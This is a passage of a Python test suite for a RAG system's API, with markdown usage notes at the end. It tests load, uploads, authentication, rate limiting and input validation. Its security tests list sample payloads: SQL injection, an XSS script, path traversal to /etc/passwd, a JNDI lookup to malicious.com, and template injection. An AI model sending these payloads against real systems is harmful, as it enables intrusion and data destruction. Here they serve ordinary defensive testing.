    async def _test_throughput(self) -> Dict[str, Any]:
        """Test system throughput capacity"""
        # Prepare multiple queries
        queries = [q['query'] for q in self.test_queries] * 3  # 24 queries total
        
        start_time = time.time()
        successful_requests = 0
        failed_requests = 0
        
        # Use thread pool for concurrent requests
        def make_request(query):
            try:
                response = requests.post(
                    f"{self.base_url}/query",
                    headers=self.headers,
                    json={"query": query},
                    timeout=30
                )
                return response.status_code == 200
            except:
                return False
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
            futures = [executor.submit(make_request, query) for query in queries]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        end_time = time.time()
        total_time = end_time - start_time
        
        successful_requests = sum(results)
        failed_requests = len(results) - successful_requests
        
        throughput_qps = successful_requests / total_time
        
        if successful_requests < len(queries) * 0.8:  # 80% success rate minimum
            raise Exception(f"Low success rate: {successful_requests}/{len(queries)}")
        
        return {
            "total_queries": len(queries),
            "successful_queries": successful_requests,
            "failed_queries": failed_requests,
            "total_time_seconds": total_time,
            "throughput_qps": throughput_qps,
            "success_rate": successful_requests / len(queries)
        }
    
    async def _test_memory_usage(self) -> Dict[str, Any]:
        """Test memory usage under load"""
        # Get initial memory usage
        initial_response = requests.get(f"{self.base_url}/status", timeout=10)
        initial_data = initial_response.json()
        initial_memory = initial_data.get('memory_usage_mb', 0)
        
        # Generate load
        queries = ["test query " + str(i) for i in range(20)]
        
        for query in queries:
            requests.post(
                f"{self.base_url}/query",
                headers=self.headers,
                json={"query": query},
                timeout=10
            )
        
        # Wait and check memory again
        await asyncio.sleep(2)
        
        final_response = requests.get(f"{self.base_url}/status", timeout=10)
        final_data = final_response.json()
        final_memory = final_data.get('memory_usage_mb', 0)
        
        memory_increase = final_memory - initial_memory
        memory_increase_percent = (memory_increase / initial_memory) * 100 if initial_memory > 0 else 0
        
        # Check for memory leaks
        if memory_increase_percent > 50:  # More than 50% increase
            raise Exception(f"Potential memory leak: {memory_increase_percent:.1f}% increase")
        
        return {
            "initial_memory_mb": initial_memory,
            "final_memory_mb": final_memory,
            "memory_increase_mb": memory_increase,
            "memory_increase_percent": memory_increase_percent,
            "queries_processed": len(queries)
        }
    
    async def _test_large_document_processing(self) -> Dict[str, Any]:
        """Test processing of large documents"""
        # Create large document
        large_content = "Large Document Test\n\n" + "This is a test paragraph with substantial content. " * 1000
        
        # Create temporary file
        temp_dir = Path(tempfile.mkdtemp())
        self.temp_files.append(temp_dir)
        
        file_path = temp_dir / "large_test_doc.txt"
        file_path.write_text(large_content)
        
        start_time = time.time()
        
        # Upload large document
        with open(file_path, 'rb') as f:
            files = {'file': ('large_test_doc.txt', f, 'text/plain')}
            headers = {"Authorization": f"Bearer {self.api_key}"}
            
            response = requests.post(
                f"{self.base_url}/upload",
                files=files,
                headers=headers,
                timeout=60  # Longer timeout for large files
            )
        
        upload_time = (time.time() - start_time) * 1000
        
        if response.status_code != 200:
            raise Exception(f"Large document upload failed: {response.status_code}")
        
        # Wait for processing
        await asyncio.sleep(10)
        
        # Test query against large document
        query_start = time.time()
        query_response = requests.post(
            f"{self.base_url}/query",
            headers=self.headers,
            json={"query": "large document test"},
            timeout=30
        )
        query_time = (time.time() - query_start) * 1000
        
        if query_response.status_code != 200:
            raise Exception(f"Query on large document failed: {query_response.status_code}")
        
        return {
            "document_size_bytes": len(large_content),
            "upload_time_ms": upload_time,
            "query_time_ms": query_time,
            "processing_successful": True,
            "file_id": response.json().get('file_id')
        }
    
    async def _test_concurrent_uploads(self) -> Dict[str, Any]:
        """Test concurrent document uploads"""
        # Create multiple test documents
        test_docs = {}
        for i in range(5):
            content = f"Test document {i}\n" + f"Content for document {i} " * 100
            test_docs[f"concurrent_test_{i}.txt"] = content
        
        # Create temp files
        temp_dir = Path(tempfile.mkdtemp())
        self.temp_files.append(temp_dir)
        
        def upload_file(filename, content):
            file_path = temp_dir / filename
            file_path.write_text(content)
            
            try:
                with open(file_path, 'rb') as f:
                    files = {'file': (filename, f, 'text/plain')}
                    headers = {"Authorization": f"Bearer {self.api_key}"}
                    
                    response = requests.post(
                        f"{self.base_url}/upload",
                        files=files,
                        headers=headers,
                        timeout=30
                    )
                
                return {
                    "filename": filename,
                    "success": response.status_code == 200,
                    "file_id": response.json().get('file_id') if response.status_code == 200 else None
                }
            except Exception as e:
                return {
                    "filename": filename,
                    "success": False,
                    "error": str(e)
                }
        
        # Upload concurrently
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [
                executor.submit(upload_file, filename, content)
                for filename, content in test_docs.items()
            ]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        total_time = time.time() - start_time
        
        successful_uploads = [r for r in results if r['success']]
        failed_uploads = [r for r in results if not r['success']]
        
        if len(successful_uploads) < len(test_docs) * 0.8:  # 80% success rate
            raise Exception(f"Low upload success rate: {len(successful_uploads)}/{len(test_docs)}")
        
        return {
            "total_uploads": len(test_docs),
            "successful_uploads": len(successful_uploads),
            "failed_uploads": len(failed_uploads),
            "total_time_seconds": total_time,
            "uploads_per_second": len(successful_uploads) / total_time,
            "success_rate": len(successful_uploads) / len(test_docs)
        }
    
    async def _test_mixed_concurrent_operations(self) -> Dict[str, Any]:
        """Test mixed concurrent operations (queries + uploads)"""
        operations = []
        
        # Prepare queries
        queries = [q['query'] for q in self.test_queries[:3]]
        
        # Prepare uploads
        upload_content = "Mixed operation test document content " * 50
        
        def run_query(query):
            try:
                response = requests.post(
                    f"{self.base_url}/query",
                    headers=self.headers,
                    json={"query": query},
                    timeout=20
                )
                return {"type": "query", "success": response.status_code == 200}
            except:
                return {"type": "query", "success": False}
        
        def run_upload(index):
            try:
                temp_dir = Path(tempfile.mkdtemp())
                self.temp_files.append(temp_dir)
                
                filename = f"mixed_test_{index}.txt"
                file_path = temp_dir / filename
                file_path.write_text(upload_content)
                
                with open(file_path, 'rb') as f:
                    files = {'file': (filename, f, 'text/plain')}
                    headers = {"Authorization": f"Bearer {self.api_key}"}
                    
                    response = requests.post(
                        f"{self.base_url}/upload",
                        files=files,
                        headers=headers,
                        timeout=30
                    )
                
                return {"type": "upload", "success": response.status_code == 200}
            except:
                return {"type": "upload", "success": False}
        
        # Mix operations
        tasks = []
        tasks.extend([lambda q=query: run_query(q) for query in queries])
        tasks.extend([lambda i=i: run_upload(i) for i in range(2)])
        
        # Run mixed operations
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(task) for task in tasks]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        total_time = time.time() - start_time
        
        # Analyze results
        query_results = [r for r in results if r['type'] == 'query']
        upload_results = [r for r in results if r['type'] == 'upload']
        
        successful_queries = sum(1 for r in query_results if r['success'])
        successful_uploads = sum(1 for r in upload_results if r['success'])
        
        total_successful = successful_queries + successful_uploads
        total_operations = len(results)
        
        if total_successful < total_operations * 0.8:
            raise Exception(f"Low mixed operations success rate: {total_successful}/{total_operations}")
        
        return {
            "total_operations": total_operations,
            "successful_operations": total_successful,
            "query_success_rate": successful_queries / len(query_results) if query_results else 0,
            "upload_success_rate": successful_uploads / len(upload_results) if upload_results else 0,
            "total_time_seconds": total_time,
            "operations_per_second": total_successful / total_time
        }
    
    async def _test_invalid_queries(self) -> Dict[str, Any]:
        """Test handling of invalid queries"""
        invalid_queries = [
            "",  # Empty query
            " ",  # Whitespace only
            "a" * 2000,  # Very long query
            "SELECT * FROM users; DROP TABLE users;",  # SQL injection attempt
            "<script>alert('xss')</script>",  # XSS attempt
            "../../etc/passwd",  # Path traversal attempt
            None  # Null query (will be handled by JSON serialization)
        ]
        
        results = []
        
        for query in invalid_queries[:-1]:  # Skip None query
            try:
                response = requests.post(
                    f"{self.base_url}/query",
                    headers=self.headers,
                    json={"query": query},
                    timeout=10
                )
                
                results.append({
                    "query": query[:50] if query else "empty",
                    "status_code": response.status_code,
                    "handled_gracefully": response.status_code in [400, 422],  # Bad request codes
                    "response_time_ms": response.elapsed.total_seconds() * 1000
                })
            except Exception as e:
                results.append({
                    "query": query[:50] if query else "empty",
                    "error": str(e),
                    "handled_gracefully": True  # Exception handling is acceptable
                })
        
        # Check that invalid queries are handled properly
        graceful_handling = sum(1 for r in results if r.get('handled_gracefully', False))
        handling_rate = graceful_handling / len(results)
        
        if handling_rate < 0.8:
            raise Exception(f"Poor invalid query handling: {handling_rate:.2f}")
        
        return {
            "invalid_queries_tested": len(results),
            "gracefully_handled": graceful_handling,
            "handling_rate": handling_rate,
            "test_results": results
        }
    
    async def _test_large_queries(self) -> Dict[str, Any]:
        """Test handling of large queries"""
        large_queries = [
            "What are " + "the best practices for network security " * 50,  # Repetitive large query
            " ".join([f"topic{i}" for i in range(500)]),  # Many keywords
            "a" * 1000 + " network security best practices",  # Large query with valid ending
        ]
        
        results = []
        
        for query in large_queries:
            try:
                start_time = time.time()
                
                response = requests.post(
                    f"{self.base_url}/query",
                    headers=self.headers,
                    json={"query": query},
                    timeout=30
                )
                
                response_time = (time.time() - start_time) * 1000
                
                # Check if system handled the large query
                handled_properly = response.status_code in [200, 400, 413, 422]  # OK or proper error codes
                
                results.append({
                    "query_length": len(query),
                    "status_code": response.status_code,
                    "response_time_ms": response_time,
                    "handled_properly": handled_properly,
                    "got_response": response.status_code == 200
                })
                
            except Exception as e:
                results.append({
                    "query_length": len(query),
                    "error": str(e),
                    "handled_properly": True  # Exception handling is acceptable
                })
        
        proper_handling = sum(1 for r in results if r.get('handled_properly', False))
        handling_rate = proper_handling / len(results)
        
        return {
            "large_queries_tested": len(results),
            "properly_handled": proper_handling,
            "handling_rate": handling_rate,
            "average_response_time_ms": statistics.mean([
                r['response_time_ms'] for r in results 
                if 'response_time_ms' in r
            ]) if any('response_time_ms' in r for r in results) else 0,
            "test_results": results
        }
    
    async def _test_malformed_data(self) -> Dict[str, Any]:
        """Test handling of malformed data"""
        malformed_requests = [
            {"invalid_field": "test"},  # Missing required query field
            {"query": 123},  # Wrong data type
            {"query": "test", "max_results": "invalid"},  # Invalid max_results
            {"query": "test", "filters": "not_an_object"},  # Invalid filters
        ]
        
        results = []
        
        for request_data in malformed_requests:
            try:
                response = requests.post(
                    f"{self.base_url}/query",
                    headers=self.headers,
                    json=request_data,
                    timeout=10
                )
                
                # Should return 400 or 422 for malformed data
                proper_error = response.status_code in [400, 422]
                
                results.append({
                    "request": str(request_data),
                    "status_code": response.status_code,
                    "proper_error_handling": proper_error,
                    "response_time_ms": response.elapsed.total_seconds() * 1000
                })
                
            except Exception as e:
                results.append({
                    "request": str(request_data),
                    "error": str(e),
                    "proper_error_handling": True  # Exception handling is acceptable
                })
        
        proper_handling = sum(1 for r in results if r.get('proper_error_handling', False))
        handling_rate = proper_handling / len(results)
        
        if handling_rate < 0.9:
            raise Exception(f"Poor malformed data handling: {handling_rate:.2f}")
        
        return {
            "malformed_requests_tested": len(results),
            "properly_handled": proper_handling,
            "handling_rate": handling_rate,
            "test_results": results
        }
    
    async def _test_resource_exhaustion(self) -> Dict[str, Any]:
        """Test system behavior under resource exhaustion scenarios"""
        # Test many concurrent requests to simulate load
        concurrent_requests = 20
        large_query = "Explain in detail " + "network security best practices " * 20
        
        def stress_request():
            try:
                response = requests.post(
                    f"{self.base_url}/query",
                    headers=self.headers,
                    json={"query": large_query},
                    timeout=30
                )
                return {
                    "success": response.status_code == 200,
                    "status_code": response.status_code,
                    "response_time_ms": response.elapsed.total_seconds() * 1000
                }
            except Exception as e:
                return {
                    "success": False,
                    "error": str(e)
                }
        
        # Run stress test
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent_requests) as executor:
            futures = [executor.submit(stress_request) for _ in range(concurrent_requests)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        total_time = time.time() - start_time
        
        successful = sum(1 for r in results if r.get('success', False))
        success_rate = successful / len(results)
        
        # System should handle at least 50% of requests even under stress
        if success_rate < 0.5:
            raise Exception(f"System failed under stress: {success_rate:.2f} success rate")
        
        return {
            "concurrent_requests": concurrent_requests,
            "successful_requests": successful,
            "success_rate": success_rate,
            "total_time_seconds": total_time,
            "requests_per_second": len(results) / total_time,
            "stress_test_passed": success_rate >= 0.5
        }
    
    async def _test_authentication(self) -> Dict[str, Any]:
        """Test API authentication security"""
        test_cases = [
            {"headers": {}, "description": "No auth header"},
            {"headers": {"Authorization": "Bearer invalid_key"}, "description": "Invalid API key"},
            {"headers": {"Authorization": "Invalid format"}, "description": "Invalid auth format"},
            {"headers": {"Authorization": f"Bearer {self.api_key}"}, "description": "Valid API key"}
        ]
        
        results = []
        
        for case in test_cases:
            try:
                response = requests.post(
                    f"{self.base_url}/query",
                    headers={**case["headers"], "Content-Type": "application/json"},
                    json={"query": "test"},
                    timeout=10
                )
                
                is_valid_auth = case["description"] == "Valid API key"
                expected_success = is_valid_auth
                actual_success = response.status_code == 200
                
                results.append({
                    "description": case["description"],
                    "status_code": response.status_code,
                    "expected_success": expected_success,
                    "actual_success": actual_success,
                    "auth_working": expected_success == actual_success
                })
                
            except Exception as e:
                results.append({
                    "description": case["description"],
                    "error": str(e),
                    "auth_working": False
                })
        
        auth_working_count = sum(1 for r in results if r.get('auth_working', False))
        auth_success_rate = auth_working_count / len(results)
        
        if auth_success_rate < 1.0:
            raise Exception(f"Authentication issues detected: {auth_success_rate:.2f}")
        
        return {
            "auth_tests": len(results),
            "auth_working_properly": auth_working_count,
            "auth_success_rate": auth_success_rate,
            "test_details": results
        }
    
    async def _test_input_validation(self) -> Dict[str, Any]:
        """Test input validation security"""
        injection_attempts = [
            {"query": "'; DROP TABLE documents; --"},
            {"query": "<script>alert('xss')</script>"},
            {"query": "../../../../etc/passwd"},
            {"query": "${jndi:ldap://malicious.com/a}"},
            {"query": "{{7*7}}"},  # Template injection
        ]
        
        results = []
        
        for attempt in injection_attempts:
            try:
                response = requests.post(
                    f"{self.base_url}/query",
                    headers=self.headers,
                    json=attempt,
                    timeout=10
                )
                
                # Check if response contains injection payload (security issue)
                response_text = response.text.lower()
                payload = attempt["query"].lower()
                
                contains_payload = payload in response_text
                safe_response = not contains_payload
                
                results.append({
                    "injection_type": attempt["query"][:20] + "...",
                    "status_code": response.status_code,
                    "contains_payload": contains_payload,
                    "safe_response": safe_response,
                    "response_length": len(response.text)
                })
                
            except Exception as e:
                results.append({
                    "injection_type": attempt["query"][:20] + "...",
                    "error": str(e),
                    "safe_response": True  # Exception is safe
                })
        
        safe_responses = sum(1 for r in results if r.get('safe_response', False))
        safety_rate = safe_responses / len(results)
        
        if safety_rate < 1.0:
            raise Exception(f"Security vulnerabilities detected: {safety_rate:.2f} safety rate")
        
        return {
            "injection_tests": len(results),
            "safe_responses": safe_responses,
            "safety_rate": safety_rate,
            "test_details": results
        }
    
    async def _test_rate_limiting(self) -> Dict[str, Any]:
        """Test rate limiting functionality"""
        # Make rapid requests to trigger rate limiting
        rapid_requests = 150  # Assuming limit is 100 RPM
        
        def rapid_request():
            try:
                response = requests.post(
                    f"{self.base_url}/query",
                    headers=self.headers,
                    json={"query": "rate limit test"},
                    timeout=5
                )
                return {
                    "status_code": response.status_code,
                    "rate_limited": response.status_code == 429
                }
            except Exception:
                return {"status_code": 0, "rate_limited": False}
        
        # Send requests rapidly
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(rapid_request) for _ in range(rapid_requests)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        total_time = time.time() - start_time
        
        rate_limited_count = sum(1 for r in results if r.get('rate_limited', False))
        successful_count = sum(1 for r in results if r.get('status_code') == 200)
        
        # Rate limiting should kick in for rapid requests
        rate_limiting_working = rate_limited_count > 0 or successful_count < rapid_requests
        
        return {
            "total_requests": len(results),
            "rate_limited_requests": rate_limited_count,
            "successful_requests": successful_count,
            "requests_per_second": len(results) / total_time,
            "rate_limiting_active": rate_limiting_working
        }
    
    async def _test_servicenow_integration(self) -> Dict[str, Any]:
        """Test ServiceNow integration functionality"""
        try:
            response = requests.get(
                f"{self.base_url}/health/servicenow",
                headers=self.headers,
                timeout=15
            )
            
            if response.status_code != 200:
                return {
                    "integration_available": False,
                    "error": f"ServiceNow health check failed: {response.status_code}"
                }
            
            data = response.json()
            component_health = data.get('component_health', {})
            
            integration_status = component_health.get('status', 'unknown')
            integration_healthy = integration_status == 'healthy'
            
            sync_details = data.get('last_sync_details', {})
            ticket_stats = data.get('ticket_statistics', {})
            
            return {
                "integration_available": True,
                "integration_healthy": integration_healthy,
                "integration_status": integration_status,
                "last_sync": sync_details.get('last_sync'),
                "total_tickets": ticket_stats.get('total_tickets', 0),
                "sync_errors": sync_details.get('errors', 0),
                "connection_test": component_health.get('details', {}).get('connection_test', False)
            }
            
        except Exception as e:
            return {
                "integration_available": False,
                "error": str(e)
            }
    
    async def _test_llm_integration(self) -> Dict[str, Any]:
        """Test LLM provider integration"""
        test_prompt = "Respond with exactly: 'LLM integration test successful'"
        
        try:
            response = requests.post(
                f"{self.base_url}/query",
                headers=self.headers,
                json={"query": test_prompt},
                timeout=20
            )
            
            if response.status_code != 200:
                raise Exception(f"LLM test query failed: {response.status_code}")
            
            data = response.json()
            answer = data.get('answer', '').lower()
            response_time = data.get('response_time_ms', 0)
            
            # Check if LLM responded appropriately
            llm_responded = len(answer) > 0
            test_passed = 'integration' in answer and 'test' in answer
            
            # Get model info if available
            model_info = data.get('model_info', {}).get('llm', {})
            
            return {
                "llm_responding": llm_responded,
                "test_passed": test_passed,
                "response_time_ms": response_time,
                "model_provider": model_info.get('provider', 'unknown'),
                "model_name": model_info.get('model', 'unknown'),
                "answer_preview": answer[:100]
            }
            
        except Exception as e:
            return {
                "llm_responding": False,
                "error": str(e)
            }
    
    async def _test_embedding_integration(self) -> Dict[str, Any]:
        """Test embedding provider integration"""
        try:
            # Test through a query that requires embedding
            response = requests.post(
                f"{self.base_url}/query",
                headers=self.headers,
                json={"query": "embedding integration test", "max_results": 3},
                timeout=15
            )
            
            if response.status_code != 200:
                raise Exception(f"Embedding test query failed: {response.status_code}")
            
            data = response.json()
            sources = data.get('sources', [])
            response_time = data.get('response_time_ms', 0)
            
            # Check if embedding search worked
            embedding_working = len(sources) > 0
            
            # Get model info if available
            model_info = data.get('model_info', {}).get('embeddings', {})
            
            return {
                "embedding_working": embedding_working,
                "sources_found": len(sources),
                "response_time_ms": response_time,
                "embedding_provider": model_info.get('provider', 'unknown'),
                "embedding_model": model_info.get('model', 'unknown'),
                "embedding_dimension": model_info.get('dimension', 0)
            }
            
        except Exception as e:
            return {
                "embedding_working": False,
                "error": str(e)
            }
    
    async def _collect_performance_metrics(self) -> Dict[str, Any]:
        """Collect comprehensive performance metrics"""
        try:
            # Get system status
            status_response = requests.get(f"{self.base_url}/status", timeout=10)
            status_data = status_response.json() if status_response.status_code == 200 else {}
            
            # Get performance metrics
            perf_response = requests.get(
                f"{self.base_url}/health/performance",
                headers=self.headers,
                timeout=10
            )
            perf_data = perf_response.json() if perf_response.status_code == 200 else {}
            
            # Calculate test metrics
            test_durations = [t.duration_ms for t in self.test_results]
            avg_test_duration = statistics.mean(test_durations) if test_durations else 0
            
            passed_tests = len([t for t in self.test_results if t.status == "PASS"])
            failed_tests = len([t for t in self.test_results if t.status == "FAIL"])
            
            return {
                "system_metrics": status_data,
                "performance_data": perf_data,
                "test_execution_metrics": {
                    "total_tests": len(self.test_results),
                    "passed_tests": passed_tests,
                    "failed_tests": failed_tests,
                    "average_test_duration_ms": avg_test_duration,
                    "test_success_rate": passed_tests / len(self.test_results) if self.test_results else 0
                }
            }
            
        except Exception as e:
            return {"error": str(e)}
    
    async def _get_system_health(self) -> Dict[str, Any]:
        """Get current system health status"""
        try:
            response = requests.get(
                f"{self.base_url}/heartbeat",
                headers=self.headers,
                timeout=20
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                return {"error": f"Health check failed: {response.status_code}"}
                
        except Exception as e:
            return {"error": str(e)}
    
    def _generate_recommendations(self) -> List[str]:
        """Generate recommendations based on test results"""
        recommendations = []
        
        # Analyze test results
        failed_tests = [t for t in self.test_results if t.status == "FAIL"]
        slow_tests = [t for t in self.test_results if t.duration_ms > 5000]
        
        # Performance recommendations
        if slow_tests:
            recommendations.append(
                f"Performance optimization needed: {len(slow_tests)} tests took >5 seconds"
            )
        
        # Failure analysis
        if failed_tests:
            error_types = {}
            for test in failed_tests:
                error_msg = test.error_message or "Unknown error"
                error_type = error_msg.split(':')[0] if ':' in error_msg else error_msg
                error_types[error_type] = error_types.get(error_type, 0) + 1
            
            for error_type, count in error_types.items():
                recommendations.append(f"Fix {error_type} issues ({count} occurrences)")
        
        # Component-specific recommendations
        component_tests = [t for t in self.test_results if 'component' in t.test_name]
        if any(t.status == "FAIL" for t in component_tests):
            recommendations.append("Review system component health and dependencies")
        
        # Security recommendations
        security_tests = [t for t in self.test_results if 'security' in t.test_name]
        if any(t.status == "FAIL" for t in security_tests):
            recommendations.append("Address security vulnerabilities identified in testing")
        
        # Concurrency recommendations
        concurrency_tests = [t for t in self.test_results if 'concurrency' in t.test_name]
        if any(t.status == "FAIL" for t in concurrency_tests):
            recommendations.append("Improve system handling of concurrent operations")
        
        # Default recommendations if no issues
        if not recommendations:
            recommendations.extend([
                "System performing well - consider monitoring setup",
                "Implement automated testing in CI/CD pipeline",
                "Regular performance benchmarking recommended"
            ])
        
        return recommendations
    
    def _calculate_overall_score(self) -> float:
        """Calculate overall system score (0-100)"""
        if not self.test_results:
            return 0.0
        
        # Base score from test pass rate
        passed_tests = len([t for t in self.test_results if t.status == "PASS"])
        base_score = (passed_tests / len(self.test_results)) * 100
        
        # Performance penalty
        slow_tests = len([t for t in self.test_results if t.duration_ms > 10000])
        performance_penalty = (slow_tests / len(self.test_results)) * 20
        
        # Critical failure penalty
        critical_failures = len([
            t for t in self.test_results 
            if t.status == "FAIL" and any(keyword in t.test_name.lower() 
                                        for keyword in ['security', 'health', 'auth'])
        ])
        critical_penalty = critical_failures * 15
        
        # Calculate final score
        final_score = max(0, base_score - performance_penalty - critical_penalty)
        
        return round(final_score, 1)
    
    def _save_analysis_results(self, analysis: SystemAnalysis):
        """Save analysis results to files"""
        try:
            # Create results directory
            results_dir = Path("test_results")
            results_dir.mkdir(exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            # Save comprehensive results
            with open(results_dir / f"analysis_{timestamp}.json", 'w') as f:
                json.dump(asdict(analysis), f, indent=2, default=str)
            
            # Save summary report
            self._create_summary_report(analysis, results_dir / f"summary_{timestamp}.txt")
            
            # Save OpenAI analysis if available
            if analysis.openai_analysis and 'error' not in analysis.openai_analysis:
                with open(results_dir / f"openai_analysis_{timestamp}.json", 'w') as f:
                    json.dump(analysis.openai_analysis, f, indent=2)
            
            self.logger.info(f"📁 Analysis results saved to {results_dir}")
            
        except Exception as e:
            self.logger.error(f"Failed to save analysis results: {e}")
    
    def _create_summary_report(self, analysis: SystemAnalysis, file_path: Path):
        """Create human-readable summary report"""
        with open(file_path, 'w') as f:
            f.write("RAG SYSTEM COMPREHENSIVE TEST ANALYSIS REPORT\n")
            f.write("=" * 50 + "\n\n")
            
            f.write(f"Analysis Timestamp: {analysis.timestamp}\n")
            f.write(f"Overall Score: {analysis.overall_score}/100\n\n")
            
            # Test Summary
            total_tests = len(analysis.test_results)
            passed_tests = len([t for t in analysis.test_results if t.status == "PASS"])
            failed_tests = len([t for t in analysis.test_results if t.status == "FAIL"])
            
            f.write("TEST SUMMARY\n")
            f.write("-" * 20 + "\n")
            f.write(f"Total Tests: {total_tests}\n")
            f.write(f"Passed: {passed_tests}\n")
            f.write(f"Failed: {failed_tests}\n")
            f.write(f"Success Rate: {(passed_tests/total_tests)*100:.1f}%\n\n")
            
            # Failed Tests
            if failed_tests > 0:
                f.write("FAILED TESTS\n")
                f.write("-" * 20 + "\n")
                for test in analysis.test_results:
                    if test.status == "FAIL":
                        f.write(f"- {test.test_name}: {test.error_message}\n")
                f.write("\n")
            
            # Performance Metrics
            f.write("PERFORMANCE METRICS\n")
            f.write("-" * 20 + "\n")
            perf = analysis.performance_metrics.get('test_execution_metrics', {})
            f.write(f"Average Test Duration: {perf.get('average_test_duration_ms', 0):.0f}ms\n")
            
            system = analysis.performance_metrics.get('system_metrics', {})
            f.write(f"System Memory Usage: {system.get('memory_usage_mb', 0):.0f}MB\n")
            f.write(f"System CPU Usage: {system.get('cpu_usage_percent', 0):.1f}%\n\n")
            
            # Recommendations
            f.write("RECOMMENDATIONS\n")
            f.write("-" * 20 + "\n")
            for i, rec in enumerate(analysis.recommendations, 1):
                f.write(f"{i}. {rec}\n")
            f.write("\n")
            
            # OpenAI Analysis
            if analysis.openai_analysis and 'error' not in analysis.openai_analysis:
                f.write("AI ANALYSIS INSIGHTS\n")
                f.write("-" * 20 + "\n")
                ai_analysis = analysis.openai_analysis.get('openai_analysis', {})
                if isinstance(ai_analysis, dict):
                    for key, value in ai_analysis.items():
                        f.write(f"{key}: {value}\n")
                else:
                    f.write(str(ai_analysis))
                f.write("\n")
    
    def cleanup(self):
        """Cleanup temporary files"""
        for temp_dir in self.temp_files:
            try:
                shutil.rmtree(temp_dir)
            except Exception as e:
                self.logger.warning(f"Failed to cleanup {temp_dir}: {e}")

# CLI Interface
def main():
    """Main CLI function for running comprehensive tests"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Comprehensive RAG System Test Suite")
    parser.add_argument('--url', default=BASE_URL, help='RAG system base URL')
    parser.add_argument('--api-key', default=API_KEY, help='API key for authentication')
    parser.add_argument('--openai-config', default='openai.json', help='OpenAI configuration file')
    parser.add_argument('--output-dir', default='test_results', help='Output directory for results')
    parser.add_argument('--verbose', action='store_true', help='Verbose logging')
    
    args = parser.parse_args()
    
    # Setup logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    # Create test suite
    test_suite = ComprehensiveTestSuite(args.url, args.api_key)
    
    try:
        print("🚀 Starting Comprehensive RAG System Analysis...")
        print("=" * 60)
        
        # Run analysis
        analysis = asyncio.run(test_suite.run_comprehensive_analysis())
        
        print("\n" + "=" * 60)
        print("📊 ANALYSIS COMPLETE")
        print("=" * 60)
        
        print(f"Overall Score: {analysis.overall_score}/100")
        print(f"Tests Passed: {len([t for t in analysis.test_results if t.status == 'PASS'])}")
        print(f"Tests Failed: {len([t for t in analysis.test_results if t.status == 'FAIL'])}")
        
        if analysis.recommendations:
            print(f"\n🔧 Top Recommendations:")
            for i, rec in enumerate(analysis.recommendations[:3], 1):
                print(f"  {i}. {rec}")
        
        # OpenAI insights
        if analysis.openai_analysis and 'error' not in analysis.openai_analysis:
            print(f"\n🤖 AI Analysis Available")
            ai_analysis = analysis.openai_analysis.get('openai_analysis', {})
            if isinstance(ai_analysis, dict) and 'health_score' in ai_analysis:
                print(f"   AI Health Score: {ai_analysis.get('health_score', 'N/A')}")
        
        print(f"\n📁 Detailed results saved to: test_results/")
        
        # Exit code based on results
        critical_failures = len([
            t for t in analysis.test_results 
            if t.status == "FAIL" and 'critical' in t.test_name.lower()
        ])
        
        if critical_failures > 0:
            print("❌ Critical failures detected")
            exit(1)
        elif analysis.overall_score < 70:
            print("⚠️ System score below acceptable threshold")
            exit(1)
        else:
            print("✅ System analysis completed successfully")
            exit(0)
            
    except Exception as e:
        print(f"❌ Analysis failed: {e}")
        exit(1)
        
    finally:
        test_suite.cleanup()

if __name__ == "__main__":
    main()
```

## Usage Instructions

### 1. Setup OpenAI Configuration (openai.json)
```json
{
  "api_key": "sk-your_openai_api_key_here",
  "model": "gpt-4-turbo-preview",
  "max_tokens": 2000,
  "temperature": 0.1,
  "analysis_prompts": {
    "system_analysis": "You are an expert system analyst. Analyze the provided RAG system test results and provide insights, identify issues, and recommend improvements.",
    "performance_review": "You are a performance engineer. Review the provided metrics and identify bottlenecks, optimization opportunities, and scaling recommendations.",
    "quality_assessment": "You are a QA engineer. Assess the quality of responses and identify areas for improvement in accuracy, relevance, and user experience."
  }
}
```

### 2. Run Comprehensive Analysis
```bash
# Full analysis with OpenAI insights
python comprehensive_test_suite.py --verbose

# Custom configuration
python comprehensive_test_suite.py \
  --url http://localhost:8000 \
  --api-key your_rag_api_key \
  --openai-config openai.json \
  --verbose

# Quick analysis without AI insights
python comprehensive_test_suite.py --openai-config nonexistent.json
```

### 3. Test Categories Covered
- ✅ **System Health Tests** (4 tests)
- ✅ **API Functionality Tests** (6 tests)  
- ✅ **Document Processing Tests** (4 tests)
- ✅ **Query Quality Tests** (8+ tests)
- ✅ **Performance Tests** (4 tests)
- ✅ **Concurrency Tests** (3 tests)
- ✅ **Edge Case Tests** (4 tests)
- ✅ **Security Tests** (3 tests)
- ✅ **Integration Tests** (3 tests)

**Total: 40+ comprehensive tests**

This test suite provides complete analysis of your RAG system with OpenAI-powered insights for intelligent recommendations! 🧪✨